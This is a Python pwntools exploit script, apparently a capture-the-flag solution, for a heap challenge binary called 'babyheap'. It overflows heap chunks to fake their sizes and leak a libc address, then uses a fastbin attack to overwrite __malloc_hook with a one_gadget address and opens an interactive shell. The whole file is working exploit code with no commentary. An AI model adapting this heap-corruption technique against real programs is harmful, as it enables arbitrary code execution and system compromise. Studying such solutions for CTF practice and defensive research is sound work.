#!/usr/bin/python
from pwn import *
import os
context.terminal = ["tmux", 'split', '-h']
elfpath = os.path.join(os.getcwd(), "babyheap")
print(elfpath)
elf = ELF(elfpath, checksec=False)
context.arch = elf.arch
io = process(elfpath)
base = io.libs()[elfpath]
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
cmd = """b *0x{:x}
set $base = 0x{:x}""".format(base + 0x114b, base)

ru = lambda x: io.recvuntil(x)
se = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda x, y: io.sendafter(x, y)
sla= lambda x, y: io.sendlineafter(x, y)

def New(sz):
    sla('Command: ', '1')
    sla('Size: ', str(sz))

def Fill(idx, ctx):
    sla('Command: ', '2')
    sla('Index: ', str(idx))
    sla('Size: ', str(len(ctx)))
    sa('Content: ', ctx)

def Del(idx):
    sla('Command: ', '3')
    sla('Index: ', str(idx))

def Show(idx):
    sla('Command: ', '4')
    sla('Index: ', str(idx))

New(0x60)
New(0x40)
New(0x100)
New(0x68)
Fill(0, flat("\x00"*0x68, 0x71))
Fill(2, flat([0x21]*10))
Del(1)
New(0x68)
Fill(1, flat([0]*9, 0x111))
Del(2)
Show(1)
io.recvuntil("\x00\x00\x11\x01\x00\x00\x00\x00\x00\x00")
libc.address = u64(io.recv(6).ljust(8, '\x00')) - 0x3c4b78
success("libc: 0x%x" % libc.address)
New(0x100)
Del(3)
Fill(2, flat('\x00'*0x100, 0, 0x71, p64(libc.sym['__malloc_hook']-0x23)))

New(0x68)
New(0x68)
Fill(4, 'A'*0x13 + p64(libc.address + 0x4527a))
New(1)
# gdb.attach(io, cmd)

io.interactive()
